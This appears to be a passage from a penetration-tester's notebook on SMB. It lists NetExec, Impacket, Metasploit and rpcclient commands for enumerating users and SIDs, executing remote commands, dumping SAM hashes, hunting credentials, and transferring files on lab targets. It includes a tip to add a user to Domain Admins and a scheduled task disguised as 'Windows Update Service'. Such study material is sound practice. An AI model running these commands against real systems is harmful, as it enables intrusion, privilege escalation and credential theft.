> ```
<!-- }}} -->

<!-- }}} -->

<!-- Users {{{-->
### Users

Enumerate domain users on the remote target

<!-- Tip {{{-->
> [!tip]
>
> Enumerate [[#Shares]] and [[#Users]] if a user is found
<!-- }}} -->

[[Metasploit]] — [smb_enumusers](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumusers/) —
SMB User Enumeration (*SAM EnumUsers*)

```sh
use auxiliary/scanner/smb/smb_enumusers
```

<!-- Example {{{-->
> [!example]-
>
> Determine what users exist via the SAM RPC service
>
> ```sh
> msfconsole
> ```
> ```sh
> use auxiliary/scanner/smb/smb_enumusers
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set RPORT 445
> ```
> ```sh
> run
> ```
<!-- }}} -->

[[NetExec]] — [Enumerate Domain Users](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-users)

```sh
nxc smb $target --users
```

```sh
nxc smb $target -u "" -p "" --users
```

```sh
nxc smb $target -u "guest" -p "" --users
```

```sh
nxc smb $target -u "guest" -p "" --users-export smb_users.txt
```

[[NetExec]] — [Enumerate Logged-On Users](https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users)

<!-- Warning {{{-->
> [!warning]
>
> Local Admin privilege required
<!-- }}} -->

Return logged on users and the [[Domain Controller|DC]]

```sh
nxc smb $target -u <localAdmin> -p <password> --loggedon-users
```

Return Windows interactive sessions

```sh
nxc smb $target -u <localAdmin> -p <password> --qwinsta
```

<!-- RID {{{-->
#### RID

**RID** (*[Relative Identifier](https://en.wikipedia.org/wiki/Relative_identifier)*)
identifies the user/group within the domain

<!-- Tip {{{-->
> [!tip]
>
> High-value accounts
>
> - **RID 500** - `Administrator`
> - **RID 501** - `Guest`
<!-- }}} -->

[[Impacket]] - [samrdump.py](https://github.com/fortra/impacket/blob/master/examples/samrdump.py)
— Brute force User `RID`s

```sh
impacket-samrdump $target
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-samrdump 10.129.14.128
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Retrieving endpoint list from 10.129.14.128
> Found domain(s):
>  . DEVSMB
>  . Builtin
> [*] Looking up users in domain DEVSMB
> Found user: mrb3n, uid = 1000
> Found user: cry0l1t3, uid = 1001
> mrb3n (1000)/FullName: 
> mrb3n (1000)/UserComment: 
> mrb3n (1000)/PrimaryGroupId: 513
> mrb3n (1000)/BadPasswordCount: 0
> mrb3n (1000)/LogonCount: 0
> mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
> mrb3n (1000)/PasswordDoesNotExpire: False
> mrb3n (1000)/AccountIsDisabled: False
> mrb3n (1000)/ScriptPath: 
> cry0l1t3 (1001)/FullName: cry0l1t3
> cry0l1t3 (1001)/UserComment: 
> cry0l1t3 (1001)/PrimaryGroupId: 513
> cry0l1t3 (1001)/BadPasswordCount: 0
> cry0l1t3 (1001)/LogonCount: 0
> cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
> cry0l1t3 (1001)/PasswordDoesNotExpire: False
> cry0l1t3 (1001)/AccountIsDisabled: False
> cry0l1t3 (1001)/ScriptPath: 
> [*] Received 2 entries.
> ```
<!-- }}} -->

[[Netexec]] — [Enumerate Users by Bruteforcing RID](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid)

```sh
nxc smb $target --rid-brute
```

```sh
nxc smb $target -u "" -p "" --rid-brute
```

```sh
nxc smb $target -u "guest" -p "" --rid-brute
```

```sh
nxc smb $target -u "guest" -p "" --rid-brute | grep -i 'sidtypeuser' | awk 'print$6' | cut -d '\' -f2 | tee userlist2.txt
```

<!-- }}} -->

<!-- SID {{{-->
#### SID

**SID** (*[Security Identifier](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)*)
is a unique identifier for a Windows object
(*e.g., user, group, computer*)

<!-- Example {{{-->
> [!example]
>
> ```sh
> S-1-5-21-<DomainID>-<RID>
> ```
<!-- }}} -->

[[Impacket]] - [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) —
Brute force [Windows Security Identifiers (SID)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)

```sh
impacket-lookupsid '<domain>/<user>'@$target -no-pass
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
> ```
<!-- }}} -->

[[Impacket]] - [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) —
Brute force [Windows Security Identifiers (SID)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)
(*usernames only*)

```sh
impacket-lookupsid '[domain/]<user>'@$target -no-pass | \
  grep 'SidTypeUser' | \
  sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > smb_users.txt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | \
>   grep 'SidTypeUser' | \
>   sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > smb_users.txt
> ```
<!-- }}} -->

[[NetExec]] — [Find Domain SID](https://www.netexec.wiki/ldap-protocol/find-domain-sid)

```sh
nxc ldap $target -u "<user>" -p "<password>" -k --get-sid
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
> ```
>
> ```sh
> LDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
> LDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\sqlsvc 
> LDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
> ```
<!-- }}} -->

[[Metasploit]] — [smb_lookupsid](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_lookupsid/) —
SMB SID User Enumeration (*LookupSid*)

<!-- Tip {{{-->
> [!tip]
>
> Enumerate local and domain accounts by setting
> [[Metasploit#Actions|Actions]]
>
> ```sh
> set ACTION LOCAL
> ```
> ```sh
> set ACTION DOMAIN
> ```
<!-- }}} -->


```sh
use auxiliary/scanner/smb/smb_lookupsid
```

<!-- Example {{{-->
> [!example]-
>
> Determine what users exist via brute force SID lookups.
> Enumerate both local and domain accounts by setting `ACTION`
> to either `LOCAL` or `DOMAIN`
>
> ```sh
> msfconsole
> ```
> ```sh
> use auxiliary/scanner/smb/smb_lookupsid
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set RPORT 445
> ```
> ```sh
> run
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

[[NetExec]] — [Executing Commands](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command)

Execute a command (*cmd*)

```sh
nxc smb $target -u <user> -p <password> -x <command>
```

```sh
nxc smb $target -u <user> -p <password> -x <command> --exec-method smbexec
```

<!-- Info {{{-->
> [!info]-
>
> `--exec-method`: Define the execution method
> (*[atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
> or
> [smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)*)
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
> ```
> ```sh
> 06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
> 06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
> 06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
> 06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
> 06-05-2016 14:34:39 [*] KTHXBYE!
> ```
<!-- }}} -->

Execute a command (*[[PowerShell]]*)

```sh
nxc smb $target -u <user> -p <password> -X <command>
```

```sh
nxc smb $target -u <user> -p <password> -X <command> --exec-method smbexec
```

<!-- Info {{{-->
> [!info]-
>
> `--exec-method`: Define the execution method
> (*[atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
> or
> [smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)*)
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
> ```
> ```sh
> 06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
> 06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
> 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
> 06-05-2016 14:36:10 [*] KTHXBYE!
> ```
<!-- }}} -->

[Impersonate Logged-On Users](https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users)

<!-- Warning {{{-->
> [!warning]
>
> Local Admin privilege required
<!-- }}} -->

```sh
nxc smb $target -u <localAdmin> -p <password> -M schtask_as -o USER=<logged_on_user> CMD=<command>
```

<!-- Info {{{-->
> [!info]- Options
>
> ```sh
> CMD            Command to execute
> USER           User to execute command as
> BINARY         OPTIONAL: Upload the binary to be executed by CMD
> TASK           OPTIONAL: Set a name for the scheduled task name
> FILE           OPTIONAL: Set a name for the command output file
> LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\')
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]-
>
> Add current user to the Domain Admin group
>
> ```sh
> powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb [] -u [] -p [] --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Credential Hunting {{{-->
## Credential Hunting

Extract hashes from the [[SAM]] database

<!-- Tip {{{-->
> [!tip]-
>
> The extracted hashes can be used to
>
> - Authenticate as another user
> - Password Cracking
> - [[Usage#Pass-The-Hash|Pass-The-Hash]]
<!-- }}} -->

[[NetExec]] - [Dump SAM](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-sam)

Dump [[SAM]] hashes using methods from [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

```sh
nxc smb $target -u <user> -p '<password>' --sam
```

```sh
nxc smb $target -u <user> -p '<password>' --sam --local-auth
```

```sh
nxc smb $target -u <user> -p '<password>' --sam secdump
```

```sh
nxc smb $target -u <user> -p '<password>' --sam secdump --local-auth
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump --local-auth
> ```
<!-- }}} -->

<!-- Linux {{{-->
### Linux

[[Linux/Privesc/Credential Hunting|Credential Hunting]] —
Check the mounted directory for [[Secrets]]

```sh
grep -iE 'user.*|pass.*|key.*|secret.*|api.*|flag.*|htb.*' /mnt/ext -R
```

[[Linux/Privesc/Credential Hunting#Hidden Items|Hidden Items]] —
Discover hidden directories

> [!todo]

<!-- }}} -->

<!-- Windows {{{-->
### Windows

[dir](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir) —
File count

```sh
dir n: /a-d /s /b | find /c ":\"
```

<!-- Info {{{-->
> [!info]-
>
> - `dir`: Application
> - `n`: Directory or drive to search
> - `/a-d`: `/a` is the attribute and `-d` means not directories
> - `/s`: Display files in a specified directory and all subdirectories
> - `/b`: Use bare format (*no heading information or summary*)
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> dir n: /a-d /s /b | find /c ":\"
> ```
> ```powershell
> 29302
> ```
<!-- }}} -->

[Get-ChildItem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.5) —
File count

```powershell
N:
```
```powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> N:
> ```
> ```powershell
> PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
> ```
>
> ```powershell
> 29302
> ```
<!-- }}} -->

<!-- Secrets {{{-->
#### Secrets

Search the attached drives for [[Secrets]]

[dir](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir) —
Search for strings in filenames

```powershell
dir n:\*cred* /s /b
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb>dir n:\*cred* /s /b
> ```
>
> ```sh
> n:\Contracts\private\credentials.txt
> ```
<!-- }}} -->

[findstr](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) —
Search for [[Secrets]] in files

```sh
findstr /s /i cred n:\*.*
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> c:\htb>findstr /s /i cred n:\*.*
> ```
> ```
> n:\Contracts\private\secret.txt:file with all credentials
> n:\Contracts\private\credentials.txt:admin:SecureCredentials!
<!-- }}} -->

[Get-ChildItem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.5) —
Search for strings in filenames

```powershell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
> ```
>
> ```
>     Directory: N:\Contracts\private
>
> Mode                 LastWriteTime         Length Name
> ----                 -------------         ------ ----
> -a----         2/23/2022   4:36 PM             25 credentials.txt
> ```
<!-- }}} -->

[Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.5) —
Search for [[Secrets]] in files

```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
> ```
>
> ```sh
> N:\Contracts\private\secret.txt:1:file with all credentials
> N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

Get files from the target and put files to the target

<!-- Upload {{{-->
### Upload

[[Pentest/General/File Transfer/Linux/Upload]] (*acquire*) files from the target machine

[[NetExec]] — Get a remote file on the remote target

```sh
nxc smb $target -u <user> -p <password> --get-file \\Windows\\<file> <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 172.16.251.152 -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
> ```
<!-- }}} -->

[[Usage#Smbclient|Smbclient]] —
Download a remote file on the remote target

```sh
get <remote_file> [local_file]
```

[[Usage#Smbclient|Smbclient]] —
Download all files recursively from the current SMB share directory

```sh
recurse ON
```
```sh
prompt OFF
```
```sh
mget *
```

<!-- Info {{{-->
> [!info]-
>
> - `recurse ON`: Enable recursion into subdirectories
> - `prompt OFF`: Disable confirmation prompts for each file transfer
> - `mget *`: Download all files matching `*`
<!-- }}} -->

[SMBmap](https://github.com/ShawnDEvans/smbmap) —
Download a file

```sh
smbmap -H $target --download "<share>\<file>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> MarciPwns@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
> ```
> ```sh
> [+] Starting download: notes\note.txt (116 bytes)
> [+] File output to: /htb/10.129.14.128-notes_note.txt
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Download {{{-->
### Download

[[Pentest/General/File Transfer/Linux/Download]] files to the target machine

[[NetExec]] — Send a file to the remote target

```sh
nxc smb $target -u <user> -p <password> --put-file <file> \\Windows\\Temp\\<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
> ```
<!-- }}} -->

[[Usage#Smbclient|Smbclient]] — Put file to the remote target

```sh
put <local_file> [remote_file]
```

[SMBmap](https://github.com/ShawnDEvans/smbmap) —
Upload a file

```sh
smbmap -H $target --upload <file> "<share>\<out_file>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
> ```
>
> ```sh
> [+] Starting upload: test.txt (20 bytes)
> [+] Upload complete.
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- RPCclient {{{-->
## RPCclient

[RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) —
Enumerate MS-RPC functionality

Command Syntax

```sh
rpcclient -N $target [-U <authentication_options>] -c "<command>"
```

Interactive Mode

```sh
rpcclient $> <command>
```

Help

```sh
rpcclient -h
```

```sh
rpcclient $> help
```

<!-- General {{{-->
### General

Query Server information

```sh
srvinfo
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> srvinfo
> ```
> ```sh
> DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
> platform_id     :       500
> os version      :       6.1
> server type     :       0x809a03
> ```
<!-- }}} -->

Get Domain, Server and User information

```sh
querydominfo
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> querydominfo
> ```
> ```sh
> Domain:         DEVOPS
> Server:         DEVSMB
> Comment:        DEVSM
> Total Users:    2
> Total Groups:   0
> Total Aliases:  0
> Sequence No:    1632361158
> Force Logoff:   -1
> Domain Server State:    0x1
> Server Role:    ROLE_DOMAIN_PDC
> Unknown 3:      0x1
> ```
<!-- }}} -->

<!-- }}} -->

<!-- User {{{-->
### User

User Information

```sh
queryuser <rid>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> queryuser 0x3e9
> ```
> ```sh
>         User Name   :   cry0l1t3
>         Full Name   :   cry0l1t3
>         Home Drive  :   \\devsmb\cry0l1t3
>         Dir Drive   :
>         Profile Path:   \\devsmb\cry0l1t3\profile
>         Logon Script:
>         Description :
>         Workstations:
>         Comment     :
>         Remote Dial :
>         Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
>         Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
>         Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
>         Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
>         Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
>         Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
>         unknown_2[0..31]...
>         user_rid :      0x3e9
>         group_rid:      0x201
>         acb_info :      0x00000014
>         fields_present: 0x00ffffff
>         logon_divs:     168
>         bad_password_count:     0x00000000
>         logon_count:    0x00000000
>         padding1[0..7]...
>         logon_hrs[0..21]...
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> The results can be used to identify the
> [[Networking/Services/SMB/Enumeration#Group Enumeration|group]]'s `RID`
> to retrieve information from the entire group
<!-- }}} -->

User Privileges

```sh
enumprivs
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> enumprivs
> ```
> ```sh
> SeCreateTokenPrivilege 0:2 (0x0:0x2)
> SeAssignPrimaryTokenPrivilege 0:3 (0x0:0x3)
> SeLockMemoryPrivilege 0:4 (0x0:0x4)
> ```
<!-- }}} -->

User Creation

```sh
createdomuser <user>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> createdomuser testuser
> ```
> ```sh
> user testuser created
> User RID: 0x44f
> ```
<!-- }}} -->

User Deletion

```sh
deletedomuser <user>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> deletedomuser testuser
> ```
> ```sh
> user testuser deleted
> ```
<!-- }}} -->

User Password Modification

```sh
setuserinfo2 <username> 23 '<password>'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> setuserinfo2 testuser 23 'NewP@ss123'
> ```
> ```sh
> Successfully set password for testuser
> ```
<!-- }}} -->

RID Cycling

```sh
rpcclient -U "" -N $target -c "lookupsids S-1-5-21-<domain>-<RID>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> lookupsids S-1-5-21-xxx-xxx-xxx-500
> ```
<!-- }}} -->

RID Brute Force

```sh
for i in $(seq 500 1100); do \
    rpcclient -N -U "" $target \
    -c "queryuser 0x$(printf '%x\n' $i)" | \
    grep "User Name\|user_rid\|group_rid" && \
    echo ""; \
done
```

SID Query (*domain*)

```sh
lsaquery
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> lsaquery
> ```
<!-- }}} -->

SID Lookup

```sh
lookupsids <sid>
```

<!-- Example {{{-->
> [!example]-
>
> Resolve a SID to its corresponding username or group name
>
> ```sh
> rpcclient $> lookupsids S-1-5-21-xxx-xxx-xxx-500
> ```
> ```sh
> S-1-5-21-xxx-xxx-xxx-500 DOMAIN\Administrator (1)
> ```
<!-- }}} -->

SID Username Lookup

```sh
lookupnames <username>
```

<!-- Example {{{-->
> [!example]-
>
> Convert a username to its corresponding SID
>
> ```sh
> rpcclient $> lookupnames Administrator
> ```
> ```sh
> Administrator S-1-5-21-xxx-xxx-xxx-500 (User: 1)
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Group {{{-->
### Group

Enumerate Group Information

```sh
querygroup <rid>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> querygroup 0x201
> ```
> ```sh
>         Group Name:     None
>         Description:    Ordinary Users
>         Group Attribute:7
>         Num Members:2
> ```
<!-- }}} -->

Enumerate Group Members

```sh
querygroupmem <rid>
```

<!-- }}} -->

<!-- Domain {{{-->
### Domain

Enumerate Deployed Domains

```sh
enumdomains
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> enumdomains
> ```
> ```sh
> name:[DEVSMB] idx:[0x0]
> name:[Builtin] idx:[0x1]
> ```
<!-- }}} -->

Enumerate Domain Users

```sh
enumdomusers
```

<!-- Example {{{-->
> [!example]-
>
> Domain users and their `RID`s
> ```sh
> rpcclient $> enumdomusers
> ```
> ```sh
> user:[mrb3n] rid:[0x3e8]
> user:[cry0l1t3] rid:[0x3e9]
> ```
<!-- }}} -->

Enumerate Domain Groups

```sh
enumdomgroups
```

<!-- Example {{{-->
> [!example]-
>
> Domain Groups and their `RID`s
>
> ```sh
> rpcclient $> enumdomgroups
> ```
> ```sh
> group:[Domain Admins] rid:[0x200]
> group:[Domain Users] rid:[0x201]
> group:[Domain Guests] rid:[0x202]
> ```
<!-- }}} -->

Enumerate Domain Password Policy

```sh
getdompwinfo
```

Enumerate Domain Trust

```sh
enumtrust
```

<!-- }}} -->

<!-- Shares {{{-->
### Shares

Enumerate Available Shares

```sh
netshareenumall
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> netshareenumall
> ```
> ```sh
> netname: print$
>         remark: Printer Drivers
>         path:   C:\var\lib\samba\printers
>         password:
> netname: home
>         remark: INFREIGHT Samba
>         path:   C:\home\
>         password:
> netname: dev
>         remark: DEVenv
>         path:   C:\home\sambauser\dev\
>         password:
> netname: notes
>         remark: CheckIT
>         path:   C:\mnt\notes\
>         password:
> netname: IPC$
>         remark: IPC Service (DEVSM)
>         path:   C:\tmp
>         password:
> ```
<!-- }}} -->

Enumerate Specific Share

```sh
netsharegetinfo <share>
```

<!-- Example {{{-->
> [!example]-
>
> Get info about the share `notes`
>
> ```sh
> rpcclient $> netsharegetinfo notes
> ```
> ```sh
> netname: notes
>         remark: CheckIT
>         path:   C:\mnt\notes\
>         password:
>         type:   0x0
>         perms:  0
>         max_uses:       -1
>         num_uses:       1
> revision: 1
> type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
> DACL
>         ACL     Num ACEs:       1       revision:       2
>         ---
>         ACE
>                 type: ACCESS ALLOWED (0) flags: 0x00 
>                 Specific bits: 0x1ff
>                 Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
>                 SID: S-1-1-0
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Misc {{{-->
### Misc

Enumerate Display Information

```sh
querydispinfo
```

Enumerate Printers

```sh
enumprinters
```

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
